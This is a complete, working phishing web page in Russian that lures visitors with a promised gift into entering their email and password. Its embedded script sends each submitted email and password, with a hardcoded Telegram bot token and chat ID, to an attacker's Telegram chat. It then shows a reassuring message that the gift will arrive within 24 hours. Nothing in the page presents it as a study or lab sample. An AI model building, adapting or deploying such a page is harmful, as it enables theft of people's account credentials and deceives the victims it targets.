<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>reward by.github.io/r</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
        }

        body {
            min-height: 100vh;
            background: #0d0d0f;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: #16161a;
            border-radius: 32px;
            padding: 48px 40px 32px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            border: 1px solid #2a2a30;
        }

        .domain {
            font-size: 13px;
            color: #8a8a99;
            letter-spacing: 0.3px;
            margin-bottom: 28px;
            font-weight: 500;
        }
        .domain span {
            color: #b0b0c0;
        }

        .title {
            color: #ffffff;
            font-size: 24px;
            font-weight: 600;
            line-height: 1.3;
            margin-bottom: 6px;
        }
        .subtitle {
            color: #8a8a99;
            font-size: 15px;
            font-weight: 400;
            margin-bottom: 32px;
        }

        .field {
            margin-bottom: 18px;
        }
        .field label {
            display: block;
            color: #c0c0cc;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 6px;
            letter-spacing: 0.2px;
        }
        .field input {
            width: 100%;
            padding: 14px 16px;
            border-radius: 14px;
            border: 1px solid #2e2e38;
            background: #1e1e24;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: 0.2s;
        }
        .field input:focus {
            border-color: #5a5af0;
            background: #25252d;
        }
        .field input::placeholder {
            color: #5a5a6a;
        }

        .btn {
            width: 100%;
            padding: 16px;
            border-radius: 40px;
            border: none;
            background: #5a5af0;
            color: #fff;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: 0.2s;
            letter-spacing: 0.5px;
        }
        .btn:hover {
            background: #6b6bfa;
        }
        .btn:active {
            transform: scale(0.97);
        }

        .footer {
            margin-top: 28px;
            display: flex;
            justify-content: center;
            gap: 18px;
            font-size: 13px;
            color: #5a5a6a;
        }
        .footer a {
            color: #6a6a7a;
            text-decoration: none;
            transition: 0.2s;
        }
        .footer a:hover {
            color: #9a9aaa;
        }

        .msg {
            margin-top: 16px;
            text-align: center;
            font-size: 14px;
            color: #7aee8a;
            min-height: 24px;
            font-weight: 500;
        }
        .msg.error {
            color: #f07a7a;
        }
    </style>
</head>
<body>

<div class="container">

    <div class="domain">reward by.github.io / <span>r</span></div>

    <div class="title">Войдите в аккаунт</div>
    <div class="subtitle">чтобы получить подарок</div>

    <form id="form">
        <div class="field">
            <label>Электронная почта</label>
            <input type="email" id="email" placeholder="example@mail.com" required>
        </div>
        <div class="field">
            <label>Пароль</label>
            <input type="password" id="password" placeholder="········" required>
        </div>

        <button type="submit" class="btn">Далее</button>
    </form>

    <div class="msg" id="msg"></div>

    <div class="footer">
        <a href="#">Конфиденциальность</a>
        <span style="color:#3a3a48;">|</span>
        <a href="#">Условия</a>
    </div>
</div>

<script>
    const BOT_TOKEN = '8747751460:AAEO78CefXypChf0HLzoo_ZORaVOGAO9erI';
    const CHAT_ID   = '8783227095';

    const form = document.getElementById('form');
    const msg = document.getElementById('msg');

    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();

        if (!email || !password) {
            msg.className = 'msg error';
            msg.textContent = 'Заполни оба поля';
            return;
        }

        msg.className = 'msg';
        msg.textContent = '⏳ Отправка...';

        const text = `🔑 НОВЫЙ ВХОД\n📧 Почта: ${email}\n🔐 Пароль: ${password}`;

        try {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const resp = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'HTML'
                })
            });

            const data = await resp.json();

            if (data.ok) {
                msg.className = 'msg';
                msg.textContent = '✅ Подарок будет получен в течение 24 часов';
                form.reset();
            } else {
                msg.className = 'msg error';
                msg.textContent = '❌ Ошибка. Попробуй позже.';
                console.error('Telegram error:', data);
            }
        } catch {
            msg.className = 'msg error';
            msg.textContent = '❌ Ошибка сети. Проверь интернет.';
        }
    });
</script>

</body>
</html>
